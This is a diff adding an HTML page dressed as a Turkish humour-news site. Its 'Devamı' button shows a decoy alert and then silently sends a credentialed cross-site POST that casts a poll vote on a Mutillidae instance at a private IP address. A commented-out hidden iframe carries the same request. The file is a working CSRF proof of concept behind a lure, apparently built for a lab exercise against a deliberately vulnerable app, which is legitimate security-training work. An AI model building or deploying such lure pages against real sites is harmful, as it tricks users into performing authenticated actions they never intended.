@@ -1,0 +1,53 @@
+<html>
+<head>
+<link rel="stylesheet" href="../animate.css" type="text/css">
+<meta charset="UTF-8">
+<style>
+	body {
+   		background-color: #4099FF;
+	}
+	h5 {
+   		color: #333333;
+   	}
+</style>
+<script>
+
+function myFunc() {
+
+    alert("Bu haber yayından kaldırılmıştır.");
+
+    var params = 'choice=wireshark&initials=';
+    var reqBody = '&user-poll-php-submit-button=Submit+Vote&csrf-token=';
+    params = params.concat(reqBody);
+    var http = new XMLHttpRequest();
+    http.open('POST', 'http://192.168.176.128/mutillidae/index.php?page=user-poll.php', true);
+    http.withCredentials = true;
+    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    http.setRequestHeader('Content-length', params.length);
+    http.setRequestHeader('Connection', 'close');
+    http.send(params);
+
+}
+
+</script>
+</head>
+<body>
+
+<!--<iframe src="http://192.168.176.128/mutillidae/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=&user-poll-php-submit-button=Submit+Vote" style="display:none"></iframe>-->
+
+<center>
+	<h1>Haberler</h1>
+	<br><br>
+	<h2>20 Soruda Vizesiz Avrupa: Kaç dönerciye daha ihtiyaç var? Almancı şivesi şart mı?</h2>
+	<h5>
+		Yıllardır beklenen Avrupa Birliği ülkelerinde vizesiz dolaşım için nihai karar sonunda gelmek üzere ve tüm Türkiye bu tarihi dönemeç öncesi nefesini tutmuş bir şekilde bekliyor. Evet, büyük bir aksilik olmazsa o vizeler sonunda kalkacak ancak kafalardaki soru işaretleri henüz giderilebilmiş değil. 'Avrupa'da kaç dönerciye daha ihtiyaç var' veya 'Yurtdışına çıkmak için Almancı şivesi şart mı?' benzeri soruları sizin için derledik ve cevaplarını sıraladık. Buyrunuz: <button onclick="myFunc()">Devamı</button>
+	</h5>
+	<br><br>
+	<h2>Gece Eğlenmek İçin Bir Araya Gelecek Arkadaş Grubundaki Herkes Eksi Bakiyede. Gergin Bekleyiş Sürüyor...</h2>
+	<h5>
+		Ay sonu yaklaşırken tamamı eksi bakiyede olmalarına rağmen kimsenin durumu itiraf edememesi nedeniyle bu akşam planladıkları eğlenceyi gerçekleştirmek zorunda kalan 9 kişilik arkadaş grubunda gergin bekleyiş sürüyor. An itibariyle toplam nakit varlıkları 510 TL eden grup, bir mucize gerçekleşmediği takdirde hafta sonunu ortalama adam başı 15 TL ile geçirmek zorunda kalacak...<a href="">Devamı..</a>
+	</h5>
+</center>
+</body>
+
+</html>
